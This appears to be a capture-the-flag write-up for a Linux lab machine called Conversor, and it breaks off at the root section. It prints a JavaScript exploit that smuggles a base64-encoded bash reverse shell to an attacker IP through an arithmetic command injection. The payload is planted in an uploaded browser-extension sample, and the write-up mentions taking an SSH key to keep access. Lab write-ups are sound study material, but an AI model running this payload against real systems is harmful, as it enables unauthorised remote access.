---

# Conversor (Medium): 10.129.X.X

![Icon](Images/browsedicon.png)

---

## Quick overview

A Linux machine (Medium) that presented the following path:

1.  → → **USER.TXT**
2.  → → **ROOT.TXT**

---

## USER.TXT

### Enumeration

We start with a nmap enummeration that will help us to discover p22 and p80.

We try to get p80 via the IP adresse or browsed.htb (by ading it in /etc/hosts)

We will see an interessting entry point Upload Extention, by trying to upload of the samples (i choosed Fontify and i will used by all the writeup).

If we scan the displayed logs, we will find browsedinternals.htb, by adding it in /etc/hosts, we will find that host a gitea.
.
![Icon](Images/browsedicon.png)

### Lets go

By analysing the file routines.sh in MarkdownPreview, we will discover arithmetic command injection vulnerability caused by lack of input validation, that we will exploit it for a reverse shell by the following script:

```js
const TARGET = "http://localhost:5000/routines/";
const ATTACKER = "10.10.x.x";
const PORT = "4444";  // Or any port you want

// Reverse shell payload
const cmd = `bash -c 'bash -i >& /dev/tcp/${ATTACKER}/${PORT} 0>&1'`;
const b64 = btoa(cmd);
const sp = "%20"; // URL encoded space

// The Arithmetic Injection: a[$(echo base64 | base64 -d | bash)]
const exploit = "a[$(echo" + sp + b64 + "|base64" + sp + "-d|bash)]";

// Execute
fetch(TARGET + exploit, { mode: "no-cors" });
```

we replace it in content.js and zip the sample and upload it, in the same we launche netcat in our machine

![Icon](Images/browsedicon.png)

and we are in with larry user, for a better persistance we can take the ssh key and reconnected with it 

---

## ROOT.TXT

### Discovery
